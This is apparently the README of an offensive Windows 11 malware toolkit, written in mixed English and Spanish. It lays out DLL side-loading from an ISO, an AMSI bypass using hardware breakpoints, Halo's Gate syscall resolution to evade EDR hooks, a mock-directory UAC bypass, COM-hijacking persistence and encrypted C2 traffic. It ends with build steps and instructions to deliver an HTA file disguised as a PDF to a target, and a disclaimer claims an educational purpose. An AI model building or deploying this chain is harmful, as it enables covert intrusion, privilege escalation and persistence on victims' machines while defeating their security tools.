# Advanced Windows 11 Entry Vector

This directory contains a sophisticated, multi-stage attack vector for Windows 11 environments, utilizing state-of-the-art evasion and persistence techniques.

## Components

### 1. Delivery: DLL Side-Loading (Phantom Hijacking)
Para eliminar el "ruido" de comandos en archivos LNK, utilizamos una técnica de **DLL Side-Loading**.
- **ISO Bundle**: El archivo ISO contiene un ejecutable legítimo y firmado por Microsoft (ej. `OneDrive.exe` o `calc.exe`) junto con una DLL maliciosa (`version.dll` o similar) que el ejecutable carga automáticamente al iniciar.
- **Evasión de Línea de Comandos**: Al ejecutar el binario legítimo, no se generan argumentos sospechosos en el registro de procesos, evadiendo heurísticas basadas en `cmd.exe` o `powershell.exe`.

### 2. Stage 1 Loader (`src/loader.cpp`)
Re-diseñado para alcanzar la invisibilidad total frente a EDRs y VBS:
- **Bypass de AMSI mediante Hardware Breakpoints (HWBP)**: En lugar de parchear bytes o cambiar permisos de memoria (que activan alarmas de EDR), el loader utiliza los registros de depuración del procesador (`DR0`-`DR7`) para interceptar `AmsiScanBuffer` y forzar un resultado limpio sin tocar una sola instrucción de la DLL original.
- **Halo's Gate (SSN Discovery)**: Resolución dinámica de números de llamadas al sistema (SSN) analizando bytes vecinos en `ntdll.dll`, lo que permite evadir hooks de EDR incluso si la función objetivo está comprometida.
- **UAC Bypass vía Mock Directory**: Utiliza la técnica de directorios con espacios (`C:\Windows \System32`) para engañar a Windows y ejecutar binarios auto-elevados desde una ubicación de "confianza", evitando modificaciones ruidosas en el registro.
- **Persistencia LotL (Living-off-the-Land)**: Implementa **COM Hijacking** de alta frecuencia para garantizar la ejecución persistente sin disparar alarmas de creación de servicios o tareas programadas.

### 3. Crypto Module (`src/crypto.h`)
Standard implementation of **ChaCha20**, used for encrypting the Stage 2 payload and communication with the C2 infrastructure.

## Building

To compile the loader using MinGW-w64 on a Linux system:

```bash
make
```

The resulting binary will be located in `bin/loader.exe`.

## Usage

1. Compile the loader.
2. Embed the loader (or a download command) into the VBScript section of the `entry_vector.pdf.hta`.
3. Deliver the polyglot file to the target.

## Disclaimer

This code is provided for educational and authorized testing purposes only. The techniques demonstrated here are representative of advanced persistent threats (APTs) and should be used to improve defensive postures.
